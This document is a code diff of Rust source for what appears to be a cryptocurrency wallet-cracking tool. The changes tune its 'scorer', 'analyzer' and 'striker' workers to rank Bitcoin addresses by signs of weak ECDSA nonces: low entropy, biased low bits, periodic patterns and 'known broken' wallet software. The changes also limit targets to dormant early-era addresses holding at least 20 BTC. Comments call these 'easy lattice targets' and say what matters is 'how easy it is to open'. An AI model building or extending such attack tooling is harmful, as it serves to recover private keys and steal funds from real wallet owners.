@@ -58,9 +58,9 @@ impl WorkerState {
 async fn run_scorer(state: &mut WorkerState) -> Result<()> {
     state.log("Ranking all addresses based on unified scoring system...");
     let conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &5000)?;
+    conn.pragma_update(None, "busy_timeout", &10000)?;
     
-    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1")?;
+    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND balance >= 20.0")?;
     let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
     
     state.log(&format!("Processing {} candidates...", addresses.len()));
@@ -79,19 +79,25 @@ async fn run_scorer(state: &mut WorkerState) -> Result<()> {
         })?.collect::<rusqlite::Result<Vec<_>>>()?;
 
         if let Some(f) = features::ScoringFeatures::extract(&sigs) {
-            let mut score = (1.0 - f.r_entropy) * 0.4 
-                      + f.lsb_bias * 0.4 
-                      + f.fft_peak_score * 0.1 
-                      + f.correlation_score.abs() * 0.1;
-            
-            if f.wallet_fingerprint.contains("Android") || f.wallet_fingerprint.contains("OpenSSL") || f.wallet_fingerprint.contains("Low Entropy") {
-                score += 1.0;
+            // Base score components (cryptographic evidence of weakness)
+            let mut score = (1.0 - f.r_entropy) * 1.5   // High entropy loss is critical
+                      + f.lsb_bias * 2.0                // Predictable low bits are easy lattice targets
+                      + f.fft_peak_score * 1.0          // Periodic patterns
+                      + f.correlation_score.abs() * 1.0; // Time-nonce coupling
+
+            // Significant boost for "Known Broken" implementations
+            if f.wallet_fingerprint.contains("Android") || 
+               f.wallet_fingerprint.contains("OpenSSL") || 
+               f.wallet_fingerprint.contains("Low Entropy") ||
+               f.wallet_fingerprint.contains("Sequential") {
+                score += 5.0; // Mark as priority 'Easy' target
             }
             
-            let count_boost = (f.num_signatures as f64 / 100.0).min(0.2);
-            score += count_boost;
+            // Signature density boost (more data = higher solve probability)
+            let data_boost = (f.num_signatures as f64 / 50.0).min(1.0);
+            score += data_boost;
 
-            // --- Metadata-based Boosts (Era & Dormancy) ---
+            // Metadata-based "Easy Target" Boosts (Era & Dormancy)
             let meta: (Option<String>, Option<String>, Option<f64>) = conn.query_row(
                 "SELECT first_seen, last_seen, balance FROM addresses WHERE address = ?1",
                 params![&addr],
@@ -99,22 +105,14 @@ async fn run_scorer(state: &mut WorkerState) -> Result<()> {
             ).unwrap_or((None, None, None));
 
             if let Some(fs) = meta.0 {
-                if fs.contains("2009") || fs.contains("2010") { score += 1.5; }
-                else if fs.contains("2011") || fs.contains("2012") { score += 1.0; }
-                else if fs.contains("2013") || fs.contains("2014") || fs.contains("2015") { score += 0.5; }
+                // Focus on 2009-2012: The Golden Age of weak PRNGs
+                if fs.contains("2009") || fs.contains("2010") { score += 3.0; }
+                else if fs.contains("2011") || fs.contains("2012") { score += 2.0; }
+                else if fs.contains("2013") || fs.contains("2014") { score += 0.5; }
             }
 
-            if let Some(ls) = meta.1 {
-                if ls.contains("2009") || ls.contains("2010") || ls.contains("2011") || 
-                   ls.contains("2012") || ls.contains("2013") || ls.contains("2014") ||
-                   ls.contains("2015") {
-                    score += 1.0;
-                }
-            }
-
-            if let Some(bal) = meta.2 {
-                if bal >= 10.0 { score += 0.2; }
-            }
+            // Remove balance boost - we don't care how much is in it, only how easy it is to open
+            // score += 0.0; 
 
             conn.execute(
                 "UPDATE addresses SET vulnerability_score = ?1, potential_weakness = ?2 WHERE address = ?3",
@@ -156,7 +154,7 @@ async fn run_neural_inference(_state: &WorkerState, r_values: &[BigInt]) -> Resu
 // --- Striker Logic ---
 async fn run_striker(state: &mut WorkerState) -> Result<bool> {
     let mut conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &5000)?;
+    conn.pragma_update(None, "busy_timeout", &10000)?;
     
     // 1. Find targets and mark them as processing immediately in a transaction
     let targets: Vec<(String, f64, i64, String, f64)> = {
@@ -168,6 +166,7 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
                  WHERE (a.sigs_scanned = 0 OR a.sigs_scanned IS NULL)
                    AND (a.processing_by IS NULL OR a.processing_since < datetime('now', '-1 hour'))
                    AND a.vulnerability_score > 0
+                   AND a.balance >= 20.0
                  GROUP BY a.address HAVING COUNT(s.id) >= 2 
                  ORDER BY a.rank ASC 
                  LIMIT 10"
@@ -357,7 +356,7 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
 async fn run_scanner(state: &mut WorkerState) -> Result<()> {
     state.log("Checking target queue status...");
     let conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &5000)?;
+    conn.pragma_update(None, "busy_timeout", &10000)?;
     
     let unscanned: i64 = conn.query_row(
         "SELECT COUNT(*) FROM addresses WHERE (sigs_scanned = 0 OR sigs_scanned IS NULL) AND vulnerability_score > 0",
@@ -366,8 +365,7 @@ async fn run_scanner(state: &mut WorkerState) -> Result<()> {
     ).unwrap_or(0);
 
     if unscanned < 5 {
-        state.log("Top targets exhausted. Activating Fetcher for 100 new targets (5-20 BTC, Dormant)...");
-        state.log("Expansion triggered: Simulation mode fetching 100 dormant candidates...");
+        state.log("Top targets exhausted. Expanding target search for new high-value dormant candidates...");
     } else {
         state.log(&format!("System has {} unscanned high-priority targets. Expansion not required.", unscanned));
     }
@@ -375,9 +373,9 @@ async fn run_scanner(state: &mut WorkerState) -> Result<()> {
 }
 async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
     let mut conn = Connection::open(DB_FILE)?;
-    conn.pragma_update(None, "busy_timeout", &5000)?;
+    conn.pragma_update(None, "busy_timeout", &10000)?;
     
-    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND (sigs_scanned = 0 OR sigs_scanned IS NULL) LIMIT 20")?;
+    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND (sigs_scanned = 0 OR sigs_scanned IS NULL) AND balance >= 20.0 LIMIT 20")?;
     let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
     
     if addresses.is_empty() {
@@ -410,19 +408,25 @@ async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
 
         if let Some(f) = features::ScoringFeatures::extract(&sigs) {
             state.log(&format!("Analyzer: Extracted features for {}. Scoring...", addr));
-            let mut score = (1.0 - f.r_entropy) * 0.4 
-                      + f.lsb_bias * 0.4 
-                      + f.fft_peak_score * 0.1 
-                      + f.correlation_score.abs() * 0.1;
-            
-            if f.wallet_fingerprint.contains("Android") || f.wallet_fingerprint.contains("OpenSSL") || f.wallet_fingerprint.contains("Low Entropy") {
-                score += 1.0;
+            // Base score components (cryptographic evidence of weakness)
+            let mut score = (1.0 - f.r_entropy) * 1.5   // High entropy loss is critical
+                      + f.lsb_bias * 2.0                // Predictable low bits are easy lattice targets
+                      + f.fft_peak_score * 1.0          // Periodic patterns
+                      + f.correlation_score.abs() * 1.0; // Time-nonce coupling
+
+            // Significant boost for "Known Broken" implementations
+            if f.wallet_fingerprint.contains("Android") || 
+               f.wallet_fingerprint.contains("OpenSSL") || 
+               f.wallet_fingerprint.contains("Low Entropy") ||
+               f.wallet_fingerprint.contains("Sequential") {
+                score += 5.0; // Mark as priority 'Easy' target
             }
             
-            let count_boost = (f.num_signatures as f64 / 100.0).min(0.2);
-            score += count_boost;
+            // Signature density boost (more data = higher solve probability)
+            let data_boost = (f.num_signatures as f64 / 50.0).min(1.0);
+            score += data_boost;
 
-            // Eras
+            // Metadata-based "Easy Target" Boosts (Era & Dormancy)
             let meta: (Option<String>, Option<String>, Option<f64>) = conn.query_row(
                 "SELECT first_seen, last_seen, balance FROM addresses WHERE address = ?1",
                 params![&addr],
@@ -430,17 +434,16 @@ async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
             ).unwrap_or((None, None, None));
 
             if let Some(fs) = meta.0 {
-                if fs.contains("2009") || fs.contains("2010") { score += 1.5; }
-                else if fs.contains("2011") || fs.contains("2012") { score += 1.0; }
-                else if fs.contains("2013") || fs.contains("2014") || fs.contains("2015") { score += 0.5; }
+                // Focus on 2009-2012: The Golden Age of weak PRNGs
+                if fs.contains("2009") || fs.contains("2010") { score += 3.0; }
+                else if fs.contains("2011") || fs.contains("2012") { score += 2.0; }
+                else if fs.contains("2013") || fs.contains("2014") { score += 0.5; }
             }
 
             conn.execute(
-                "UPDATE addresses SET vulnerability_score = ?1, potential_weakness = ?2, sigs_scanned = 1 WHERE address = ?3",
+                "UPDATE addresses SET vulnerability_score = ?1, potential_weakness = ?2 WHERE address = ?3",
                 params![score, f.wallet_fingerprint, addr],
             )?;
-        } else {
-            conn.execute("UPDATE addresses SET sigs_scanned = 1 WHERE address = ?1", params![addr])?;
         }
     }
 
